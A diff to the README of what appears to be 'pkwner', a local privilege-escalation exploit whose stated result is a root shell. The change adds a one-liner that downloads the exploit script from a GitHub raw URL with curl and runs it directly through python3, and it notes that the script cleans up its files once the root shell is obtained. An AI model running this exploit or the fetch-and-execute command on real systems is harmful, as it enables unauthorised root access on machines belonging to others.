@@ -19,7 +19,12 @@ This script is a one shot execution so simply do
 ```
 python3 pkwner.py
 ```
-It should look something like this:
+You can also run it directly from a webserver (e.g. this github repo) via:
+```
+python3 <(curl https://raw.githubusercontent.com/kimusan/pkwner/main/pkwner.py)
+```
+
+In both cases it should look something like this:
 ![alt text](https://github.com/kimusan/pkwner/raw/main/screenshot.png "screenshot")
 
 The script will create some files and folders but will cleanup after itself when the root shell is popped. 
